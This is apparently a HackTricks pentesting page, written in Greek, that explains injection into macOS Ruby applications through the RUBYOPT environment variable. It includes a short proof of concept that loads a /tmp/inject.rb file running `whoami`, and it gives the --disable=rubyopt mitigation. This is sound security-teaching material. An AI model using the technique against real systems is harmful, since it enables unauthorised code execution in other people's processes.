# Injection σε Ruby Applications του macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Το Ruby αναλύει τα υποστηριζόμενα command-line switches από τη μεταβλητή περιβάλλοντος `RUBYOPT` πριν εκτελέσει ένα script. Παρόλο που το Ruby απορρίπτει ορισμένα switches εκεί, το `-I` μπορεί να προσθέσει έναν κατάλογο αναζήτησης libraries και το `-r` μπορεί να κάνει require μια library. Επομένως, μια διεργασία που εκκινεί το Ruby με environment variables που ελέγχει ο attacker μπορεί να εξαναγκαστεί να φορτώσει Ruby code που ελέγχει ο attacker.<sup>[[1]](#references)</sup>

Δημιουργήστε το `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Δημιουργήστε ένα benign Ruby script, όπως το `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Εκτελέστε το με μια ελεγχόμενη τιμή `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Για να απενεργοποιήσετε αυτήν τη συμπεριφορά, περάστε το `--disable=rubyopt` (ή `--disable-rubyopt`) **πριν** από το όνομα του script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Μια επιλογή που γράφεται μετά το `hello.rb` μεταβιβάζεται στο script μέσω του `ARGV`· δεν απενεργοποιεί την προγενέστερη επεξεργασία του `RUBYOPT`.<sup>[[1]](#references)</sup>

## References

- [1] [Τεκμηρίωση Ruby - Επιλογές γραμμής εντολών Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
